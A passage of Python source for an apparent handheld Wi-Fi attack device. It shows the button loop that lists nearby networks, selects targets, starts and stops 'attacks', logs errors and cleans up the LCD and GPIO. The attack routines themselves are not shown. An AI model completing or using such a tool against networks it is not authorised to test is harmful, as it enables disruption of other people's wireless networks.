                if btn == "KEY2":  # Stop attacks
                    while pressed_button() == "KEY2":
                        time.sleep(0.05)
                    
                    stopped = stop_all_attacks()
                    show_status(f"Stopped {stopped} attacks")
                    time.sleep(2)
                    
                    current_screen = "networks"
                    is_selected = networks[selected_index]['bssid'] in [t['bssid'] for t in selected_targets]
                    marker = "[*]" if is_selected else "   "
                    show([f"NETWORKS ({len(networks)} found)", f"{marker} {networks[selected_index]['essid']}", f"Selected: {len(selected_targets)}", "UP/DOWN: Navigate", "OK: Toggle select", "RIGHT: Start attack"])
                
                elif btn == "KEY3":  # Exit
                    simple_cleanup()
                    running = False
                    break
            
            else:
                time.sleep(0.05)
                
        except Exception as e:
            log(f"CRASH PREVENTION: Error in main loop: {str(e)}")
            import traceback
            log(f"Full error: {traceback.format_exc()}")
            show_status("Error - restarting")
            time.sleep(2)
            try:
                show_main_menu_page()
            except:
                show(["Error occurred", "Restarting...", "", "Press KEY3"])
                time.sleep(3)

finally:
    # Cleanup
    if running:  # Only do cleanup if we didn't already clean up
        simple_cleanup()
    show(["Payload finished"])
    time.sleep(1)
    LCD.LCD_Clear()
    GPIO.cleanup()